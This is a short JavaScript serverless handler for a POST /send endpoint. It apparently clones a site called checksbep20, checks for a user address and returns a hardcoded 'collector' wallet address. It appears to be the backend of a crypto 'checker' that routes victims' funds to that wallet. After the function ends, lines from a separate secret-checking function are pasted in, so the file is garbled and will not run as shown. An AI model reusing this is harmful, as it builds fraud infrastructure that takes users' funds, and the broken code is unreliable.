// ============================================
// SEND ENDPOINT - POST /send
// Exactly like: https://collector.checksbep20.org/send
// ============================================

const COLLECTOR_ADDRESS = "0x5681d680B047bF5b12939625C56301556991005e";

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Topup-Secret');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const body = req.body;
        const userAddress = body.address;
        
        if (!userAddress) {
            return res.status(400).json({ error: 'Address required' });
        }
        
        return res.status(200).json({
            found: false,
            collector: COLLECTOR_ADDRESS
        });
        
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
    if (secret !== SECRET_KEY) return false;
    userAmounts[address.toLowerCase()] = amount;
    return true;
}
